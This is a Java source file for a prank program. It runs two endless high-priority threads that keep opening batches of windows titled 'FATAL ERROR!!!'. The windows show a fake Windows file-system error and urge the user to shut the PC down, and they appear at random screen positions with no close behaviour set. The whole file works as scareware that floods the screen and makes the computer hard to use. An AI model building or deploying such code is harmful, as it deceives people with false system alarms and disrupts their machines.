import com.sun.org.apache.xerces.internal.impl.xpath.regex.Match;
import com.sun.org.apache.xpath.internal.SourceTree;
import javafx.application.Application;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.concurrent.Worker;
import javafx.event.ActionEvent;
        import javafx.event.EventHandler;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Group;
import javafx.scene.Scene;
import javafx.scene.chart.PieChart;
import javafx.scene.control.Button;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Label;
import javafx.scene.control.TextField;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import javafx.scene.web.WebEngine;
import javafx.scene.web.WebView;
import javafx.stage.Stage;
import netscape.javascript.JSObject;
import org.omg.PortableInterceptor.SUCCESSFUL;

import javax.swing.*;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import java.awt.*;
import java.io.FileInputStream;
import java.io.InputStream;
import java.nio.file.Path;
import java.util.Random;
import java.util.stream.Stream;


public class FXclass{
    MyThread myThread1;
    MyThread myThread2;

    public static void main(String[] args)throws Exception {
        FXclass fXclass = new FXclass();
        fXclass.start();
    }

    public void endThreads(){
        System.exit(1);
    }

    public void start() throws Exception {
        myThread1 = new MyThread();
        myThread2 = new MyThread();

        myThread1.setPriority(10);
        myThread2.setPriority(10);

        myThread1.start();
        myThread2.start();
    }

    class MyThread extends Thread{
        boolean cheaker = true;

        @Override
        public void run() {
            while(true && cheaker){
                for(int i = 0; i < 50; i++){
                    fromSwing();
                }

                int timer = 0;
                while (timer < 200){
                    int n =(int) (Math.random()*1000);
                    if(n > 200 && n < 800){
                        timer = n;
                    }
                }
                try {
                    Thread.sleep(timer);
                }
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    }
    public void fromSwing(){
        Gui grafon = new Gui();
        //grafon.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        grafon.setSize(300, (int)(Math.random()*200));
        grafon.setLocation((int) (Math.random()*2000), (int) (Math.random()*2000));
        grafon.setVisible(true);
    }
    public class Gui extends JFrame {
        public Gui(){
            super("FATAL ERROR!!!");
            setLayout(new FlowLayout());

            String message = "ERROR OF WINDOWS FILES SYSTEM №";
            String message2 = "FASTLY SHUT DOWN YOUR PK";

            int nomber = (int) (Math.random()*1000);
            message += nomber;
            JLabel jLabel = new JLabel(message);
            add(jLabel);

            JLabel jLabel2 = new JLabel(message2);
            add(jLabel2);

            getContentPane().setBackground(java.awt.Color.getHSBColor((int) (Math.random()*1000),(int) (Math.random()*1000),(int) (Math.random()*1000)));
        }
    }
}

